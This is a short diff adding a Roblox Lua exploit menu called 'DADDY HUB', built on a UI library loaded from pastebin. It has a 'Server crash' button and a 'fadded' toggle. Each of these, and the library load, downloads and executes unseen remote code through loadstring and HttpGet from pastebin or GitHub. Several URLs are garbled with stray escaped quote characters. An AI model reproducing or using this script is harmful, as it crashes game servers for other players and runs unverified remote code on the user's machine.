@@ -1,0 +1,16 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/3gQQtaKX%22))()
+
+local AimbotTab = CoastingLibrary:CreateTab("DADDY HUB")
+local MainSection = AimbotTab:CreateSection("Main")
+local credits = CoastingLibrary:CreateTab("Credits")
+local credits = credits:CreateSection("Credits")
+
+MainSection:CreateButton("Server crash", function()
+  loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua%27),true))()
+end)
+
+MainSection:CreateToggle("fadded", function(boolean)
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+end)
+
+credits:CreateLabel("Namey", "MADE BY ME HEHE")
